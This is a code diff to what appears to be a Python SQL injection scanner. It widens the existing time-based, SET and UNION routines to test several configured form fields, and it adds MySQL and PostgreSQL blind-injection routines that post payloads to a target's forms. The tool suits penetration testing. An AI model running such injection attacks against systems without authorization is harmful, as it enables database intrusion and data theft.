@@ -27,6 +27,7 @@ from lib.core.parser.cmdline import proxy_port
 from lib.core.parser.cmdline import proxy_server
 from lib.core.enums.payloads import Payload
 from lib.core.parser.cmdline import user_proxy
+from lib.core.payloads.blindbased import BlindBased
 
 def host_injection(url,vuln_parameter="", payload="" ):
 
@@ -99,32 +100,33 @@ def time_based_inejction(url,payload=True,isauto=True):
                 form_data[input_field.get('name')] = input_field.get('value', '')
 
             for _payload in time_based_payload().split("\n"):
-                form_data_copy = form_data.copy()
-                payload_field_name = 'username'  # Replace with the actual name
-                form_data_copy[payload_field_name] = _payload
+                for line in settings.INJECTABLE_ARES_ON_THE_FORM:
+                    form_data_copy = form_data.copy()
+                    payload_field_name = line  # Replace with the actual name
+                    form_data_copy[payload_field_name] = _payload
 
-                # Make the POST request
-                request = urllib.request.Request(url, data=urllib.parse.urlencode(form_data_copy).encode(), method='POST')
-                response = urllib.request.urlopen(request)
+                    # Make the POST request
+                    request = urllib.request.Request(url, data=urllib.parse.urlencode(form_data_copy).encode(), method='POST')
+                    response = urllib.request.urlopen(request)
 
-                response_content = response.read()
+                    response_content = response.read()
 
-                form_in_response = get_form_from_response(response_content)
-                form_details = get_form_details(form_in_response)
+                    form_in_response = get_form_from_response(response_content)
+                    form_details = get_form_details(form_in_response)
 
-                if is_sql_injection_vulnerable(response_content):
-                    logger.warning("Potential sql injection detected!!!")
-                    # Call sql_injection_basic_detection with both parameters
-                    sql_injection_basic_detection(form_in_response, form_details)
-                else:
-                    if _ < 1:
-                        logger.critical("No injectable areas found on the target")
+                    if is_sql_injection_vulnerable(response_content):
+                        logger.warning("Potential sql injection detected!!!")
+                        # Call sql_injection_basic_detection with both parameters
                         sql_injection_basic_detection(form_in_response, form_details)
-                        _ += 1
+                    else:
+                        if _ < 1:
+                            logger.critical("No injectable areas found on the target")
+                            sql_injection_basic_detection(form_in_response, form_details)
+                            _ += 1
 
 
 
-                return form_in_response
+                    return form_in_response
 
     except ValueError:
         pass
@@ -162,41 +164,42 @@ def make_set_sql_injection(url,random_header=False):
                 form_data[input_field.get('name')] = input_field.get('value', '')
 
             for _payload in make_set_sql_payload().split("\n"):
-                form_data_copy = form_data.copy()
-                payload_field_name = 'username'  # Replace with the actual name
-                form_data_copy[payload_field_name] = _payload
+                for line in settings.INJECTABLE_ARES_ON_THE_FORM:
+                    form_data_copy = form_data.copy()
+                    payload_field_name = line  # Replace with the actual name
+                    form_data_copy[payload_field_name] = _payload
 
-                request = urllib.request.Request(url, data=urllib.parse.urlencode(form_data_copy).encode(), method='POST')
-                if random_header is True:
-                    if settings.CUSTOM_HEADER_INJECTION:
-                        custom_header_name = settings.CUSTOM_HEADER_NAME
-                        custom_header_value = settings.CUSTOM_HEADER_VALUE
+                    request = urllib.request.Request(url, data=urllib.parse.urlencode(form_data_copy).encode(), method='POST')
+                    if random_header is True:
+                        if settings.CUSTOM_HEADER_INJECTION:
+                            custom_header_name = settings.CUSTOM_HEADER_NAME
+                            custom_header_value = settings.CUSTOM_HEADER_VALUE
 
-                        if custom_header_name and custom_header_value:
-                            request.add_header(custom_header_name, custom_header_value)
+                            if custom_header_name and custom_header_value:
+                                request.add_header(custom_header_name, custom_header_value)
+                            else:
+                                print("Skipping invalid header name or value.")
                         else:
-                            print("Skipping invalid header name or value.")
+                            logger.warning("header injection disabled.")
+
+
+
+                    response = urllib.request.urlopen(request)
+
+                    response_content = response.read()
+
+                    form_in_response = get_form_from_response(response_content)
+                    form_details = get_form_details(form_in_response)
+
+                    if is_sql_injection_vulnerable(response_content):
+                        logger.warning("Potential SQL injection detected!!!")
+                        # Call sql_injection_basic_detection with both parameters
+                        sql_injection_basic_detection(form_in_response, form_details)
                     else:
-                        logger.warning("header injection disabled.")
-
-
-
-                response = urllib.request.urlopen(request)
-
-                response_content = response.read()
-
-                form_in_response = get_form_from_response(response_content)
-                form_details = get_form_details(form_in_response)
-
-                if is_sql_injection_vulnerable(response_content):
-                    logger.warning("Potential SQL injection detected!!!")
-                    # Call sql_injection_basic_detection with both parameters
-                    sql_injection_basic_detection(form_in_response, form_details)
-                else:
-                    if _ < 1:
-                        logger.critical("No SQL injection detected on the target")
-                        logger.debug("using payload:%s"%_payload)
-                        _ += 1
+                        if _ < 1:
+                            logger.critical("No SQL injection detected on the target")
+                            logger.debug("using payload:%s"%_payload)
+                            _ += 1
                     
     
     except Exception as e:
@@ -217,7 +220,56 @@ def union_based_injection(url):
                 for input_field in form.find_all('input'):
                     form_data[input_field.get('name')] = input_field.get('value', '')
                 for _payload in union_payload().split("\n"):
-                    logger.info(f"testing {Payload.UNION_ALL_SELECT.value}")
+                    for line in settings.INJECTABLE_ARES_ON_THE_FORM:
+                        logger.info(f"testing {Payload.UNION_ALL_SELECT.value}")
+                        form_data_copy = form_data.copy()
+                        payload_field_name = line  # Replace with the actual name
+                        form_data_copy[payload_field_name] = _payload
+
+                        # Make the POST request
+                        request = urllib.request.Request(url, data=urllib.parse.urlencode(form_data_copy).encode(), method='POST')
+                        response = urllib.request.urlopen(request)
+
+                        response_content = response.read()
+
+                        form_in_response = get_form_from_response(response_content)
+                        form_details = get_form_details(form_in_response)
+                        sql_injection_basic_detection(form_in_response, form_details)
+
+                        if is_sql_injection_vulnerable(response_content):
+                            logger.warning("Potential sql injection detected!!!")
+                            # Call sql_injection_basic_detection with both parameters
+                            sql_injection_basic_detection(form_in_response, form_details)
+                        else:
+                            logger.debug("No injectable areas found on the target via payload%s"%_payload)
+                            sql_injection_basic_detection(form_in_response, form_details)
+
+
+
+
+                # return form_in_response
+
+        except ValueError:
+            continue
+
+        except Exception as e:
+            logger.error(e)
+            traceback.print_exc()
+
+
+def mysql_blind_based_injection(url):
+    _ = 0
+    _retval = None
+    for __ in BlindBased.mysql_version_query().split("\n"):
+        try:
+            forms = get_all_forms(url)
+
+            for form in forms:
+                form_data = {}
+                for input_field in form.find_all('input'):
+                    form_data[input_field.get('name')] = input_field.get('value', '')
+                for _payload in BlindBased.mysql_version_query().split("\n"):
+                    logger.info(f"testing {Payload.MYSQL_BLIND_BASED.value}")
                     form_data_copy = form_data.copy()
                     payload_field_name = 'username'  # Replace with the actual name
                     form_data_copy[payload_field_name] = _payload
@@ -252,8 +304,53 @@ def union_based_injection(url):
             logger.error(e)
             traceback.print_exc()
 
+def postgre_sql_blind_injection(url):
+    _ = 0
+    _retval = None
+    for __ in BlindBased.postgre_sql_payload_version_query().split("\n"):
+        try:
+            forms = get_all_forms(url)
+
+            for form in forms:
+                form_data = {}
+                for input_field in form.find_all('input'):
+                    form_data[input_field.get('name')] = input_field.get('value', '')
+                for _payload in BlindBased.postgre_sql_payload_version_query().split("\n"):
+                    for line in settings.INJECTABLE_ARES_ON_THE_FORM:
+                        logger.info(f"testing {Payload.POSTGRE_SQL_VERSION_QUERY_BLIND_BASED.value}")
+                        form_data_copy = form_data.copy()
+                        payload_field_name = line  # Replace with the actual name
+                        form_data_copy[payload_field_name] = _payload
+
+                        # Make the POST request
+                        request = urllib.request.Request(url, data=urllib.parse.urlencode(form_data_copy).encode(), method='POST')
+                        response = urllib.request.urlopen(request)
+
+                        response_content = response.read()
+
+                        form_in_response = get_form_from_response(response_content)
+                        form_details = get_form_details(form_in_response)
+                        sql_injection_basic_detection(form_in_response, form_details)
+
+                        if is_sql_injection_vulnerable(response_content):
+                            logger.warning("Potential sql injection detected!!!")
+                            # Call sql_injection_basic_detection with both parameters
+                            sql_injection_basic_detection(form_in_response, form_details)
+                        else:
+                            logger.debug("No injectable areas found on the target via payload%s"%_payload)
+                            sql_injection_basic_detection(form_in_response, form_details)
 
 
+
+
+                # return form_in_response
+
+        except ValueError:
+            continue
+
+        except Exception as e:
+            logger.error(e)
+            traceback.print_exc()
 
 
 # make_set_sql_injection("http://testfire.net/index.jsp?content=business_deposit.htm",random_header=True)
